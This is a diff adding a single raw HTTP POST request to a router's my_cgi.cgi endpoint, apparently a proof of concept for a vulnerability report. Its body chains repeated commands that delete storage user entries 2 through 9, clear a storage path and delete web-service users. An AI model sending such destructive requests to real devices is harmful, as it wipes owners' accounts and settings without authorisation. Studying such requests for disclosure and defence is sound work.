@@ -1,0 +1,13 @@
+POST /my_cgi.cgi?0.334294768462718 HTTP/1.1
+Host: 192.168.0.1
+Content-Length: 513
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://192.168.0.1
+Referer: http://192.168.0.1/Storage.htm
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+request=delete_entry&table_name=storage_user&rowid=2&request=delete_entry&table_name=storage_user&rowid=3&request=delete_entry&table_name=storage_user&rowid=4&request=delete_entry&table_name=storage_user&rowid=5&request=delete_entry&table_name=storage_user&rowid=6&request=delete_entry&table_name=storage_user&rowid=7&request=delete_entry&table_name=storage_user&rowid=8&request=delete_entry&table_name=storage_user&rowid=9&request=update_entry&table_name=storage_user&rowid=1&storage_path=&request=delete_ws_user
